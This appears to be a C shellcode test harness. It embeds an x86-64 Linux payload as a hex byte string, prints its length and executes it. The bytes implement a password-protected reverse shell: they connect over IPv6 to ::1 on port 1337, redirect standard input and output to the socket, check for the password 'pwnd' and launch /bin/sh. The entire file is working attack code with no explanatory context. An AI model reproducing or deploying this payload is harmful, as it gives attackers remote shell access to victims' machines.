#include<stdio.h>
#include<string.h>
 
 
unsigned char code[] = \
"\x31\xf6\xf7\xe6\xff\xc6\x6a\x0a\x5f\x04\x29\x0f\x05\x48\x93\x52\x48\xb9\xff\xff\xff\xff\xff\xff\xff\xfe\x48\xf7\xd1\x51\x52\x52\x66\x68\x05\x39\x66\x6a\x0a\x53\x5f\x54\x5e\x6a\x1c\x5a\x6a\x2a\x58\x0f\x05\x48\x96\x6a\x03\x5e\x6a\x21\x58\xff\xce\x0f\x05\xe0\xf7\x48\x31\xc0\x50\x5f\x50\x54\x5e\x6a\x04\x5a\x0f\x05\x68\x70\x77\x6e\x64\x5b\x39\x1e\x75\x1a\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5e\x99\x6a\x3b\x58\x0f\x05\x90";

main()
{
 
printf("Shellcode Length:  %d\n", (int)strlen(code));
 
int (*ret)() = (int(*)())code;
 
ret();
 
}

